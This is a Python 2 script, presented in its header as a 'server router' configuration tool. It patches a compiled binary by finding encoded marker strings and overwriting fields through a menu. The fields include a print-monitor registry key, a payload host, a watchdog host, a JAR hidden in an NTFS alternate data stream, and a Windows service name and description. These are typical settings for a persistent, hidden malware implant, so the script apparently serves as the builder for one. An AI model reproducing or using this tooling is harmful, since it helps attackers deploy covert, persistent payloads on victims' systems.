#######################
#
#  This script is used to define the configuration points of the server router
#
#######################

import os.path
import sys
import binascii

#jvm path marker
jvm_off = 400 * 2
jvm_path = '\x00\x00\x22\x00\x26\x00\x29\x00\x2c'

#reg key path
reg_off = 400 * 2
reg_str =  '\x00\x00\x16\x00\x23\x00\x17\x00\x21'

#watch dog host path
watch_dog_off = 400 * 2
watch_dog_str = '\x00\x00\x2f\x00\xc6\x00\xb9\x00\x1a'

#payload host path
payload_off = 400 * 2
payload_host_str = '\x00\x00\x11\x00\x17\x00\x29\x00\x4c' 

#ads path
ads_off = 400 * 2
ads_path_str = '\x00\x00\x13\x00\x25\x00\x14\x00\x38'

#service name
svc_name_off = 200 * 2
svc_name_str = '\x00\x00\x1a\x00\x62\x00\x11\x00\x51'

#service description
svc_desc_off = 200 * 2
svc_desc_str = '\x00\x00\x14\x00\x54\x00\x15\x00\x41' 

def encodeStr( word ):
  out = ''
  for i in word:
    o = ord(i)
    #print hex(o)
    nib_l = o & 0x0f
    nib_h = (o & 0xf0) >> 4
    out += chr(nib_h) + chr(nib_l)
  return out
  
def setServiceName( filepath ):
  print "\nEnter the service name"
  sys.stdout.write('> ')
  in_data = raw_input()
  if len(in_data) > 200 / 2:
    print "Error: Length of the service name string too long. Max Length = 100"
    return
  
  #convert to unicode
  in_data = encodeStr(in_data)
  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(svc_name_str)
  print "Index: ", idx
  cert_str_off = idx - svc_name_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(cert_str_off)
  fh.write(uni_port)
  fh.close()
  
def setServiceDescription( filepath ):
  print "\nEnter the service description"
  sys.stdout.write('> ')
  in_data = raw_input()
  if len(in_data) > 200 / 2:
    print "Error: Length of the service description string too long. Max Length = 100"
    return
  
  #convert to unicode
  in_data = encodeStr(in_data)
  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(svc_desc_str)
  print "Index: ", idx
  cert_str_off = idx - svc_desc_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(cert_str_off)
  fh.write(uni_port)
  fh.close()

def setAdsPath( filepath ):
  print "\nEnter the path to store the JAR ADS"
  sys.stdout.write('> ')
  in_data = raw_input()
  if len(in_data) > 400 / 2:
    print "Error: Length of the JAR ADS path string too long. Max Length = 200"
    return
  
  #convert to unicode
  in_data = encodeStr(in_data)
  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(ads_path_str)
  print "Index: ", idx
  cert_str_off = idx - ads_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(cert_str_off)
  fh.write(uni_port)
  fh.close()
  
def setWatchdogHostPath( filepath ):
  print "\nEnter the watch dog host path"
  sys.stdout.write('> ')
  in_data = raw_input()
  if len(in_data) > 400 / 2:
    print "Error: Length of the watch dog host path string too long. Max Length = 200"
    return
  
  #convert to unicode
  in_data = encodeStr(in_data)
  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(watch_dog_str)
  print "Index: ", idx
  cert_str_off = idx - watch_dog_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(cert_str_off)
  fh.write(uni_port)
  fh.close()
  
def setPayloadHostPath( filepath ):
  print "\nEnter the payload host path"
  sys.stdout.write('> ')
  in_data = raw_input()
  if len(in_data) > 400 / 2:
    print "Error: Length of the payload host path string too long. Max Length = 200"
    return
  
  #convert to unicode
  in_data = encodeStr(in_data)
  uni_port = in_data.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(payload_host_str)
  print "Index: ", idx
  cert_str_off = idx - payload_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(cert_str_off)
  fh.write(uni_port)
  fh.close()
  
def setRegKeyPath( filepath ):
  print "\nEnter the print monitor registry key name"
  sys.stdout.write('> ')
  reg_in = raw_input()
  if len(reg_in) > 400 / 2:
    print "Error: Length of registry name too long. Max Length = 200"
    return
  
  #convert to unicode
  reg_in = encodeStr(reg_in)
  uni_reg = reg_in.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(reg_str)
  print "Index: ", idx
  reg_str_off = idx - reg_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(reg_str_off)
  fh.write(uni_reg)
  fh.close()
  
def setJvmPath( filepath ):
  print "\nEnter the JVM Path"
  sys.stdout.write('> ')
  cert_in = raw_input()
  if len(cert_in) > 400 / 2:
    print "Error: Length of certificate string too long. Max Length = 100"
    return
  
  #convert to unicode
  cert_in = encodeStr(cert_in)
  uni_port = cert_in.encode('utf16')[2:] + "\x00\x00\x00\x00"
  
  #Open the file
  f = open(filepath, 'rb')
  data = f.read()
  f.close()  

  #Find port marker
  idx = data.find(jvm_path)
  #print "Index: ", idx
  jvm_str_off = idx - jvm_off
  #print binascii.hexlify(data[port_str_off: port_str_off + port_off ])
  #print "Current certificate name: " + data[cert_str_off: cert_str_off + cert_off ]
  
  #Overwrite the string
  fh = open(filepath, "r+b")
  fh.seek(jvm_str_off)
  fh.write(uni_port)
  fh.close()
  
def print_menu():
  print "\nConfiguration Menu:"
  print "-------------------"
  print "1. Set JVM library directory (ex. C:\Program Files\Java\jre7\bin\client)"
  print "2. Set Print Monitor Key Name"
  print "3. Set Watchdog Host Path"
  print "4. Set Payload Host Path"
  print "5. Set JAR ADS Path"
  print "6. Set Service Name"
  print "7. Set Service Description"
  print "8. Quit\n"
  sys.stdout.write('> ')
  return raw_input()

if len (sys.argv) == 2:  
  (progname, filepath) = sys.argv  
else:  
  print len (sys.argv)  
  print 'Usage: {0} <file path>'.format (sys.argv[0])  
  exit (1) 
  
#Check that the file exists
if os.path.isfile(filepath) == False:
  print '\n[-] Error: "%s" doesnt exist.' % filepath
  exit (1)
  
#Print menu
while(1):
  choice = print_menu() 
  if choice == '1':
    setJvmPath(filepath)
  elif choice == '2':
    setRegKeyPath(filepath) 
  elif choice == '3':
    setWatchdogHostPath(filepath)
  elif choice == '4':
    setPayloadHostPath(filepath)
  elif choice == '5':
    setAdsPath(filepath)
  elif choice == '6':
    setServiceName(filepath)
  elif choice == '7':
    setServiceDescription(filepath)
  elif choice == '8':
    exit(1)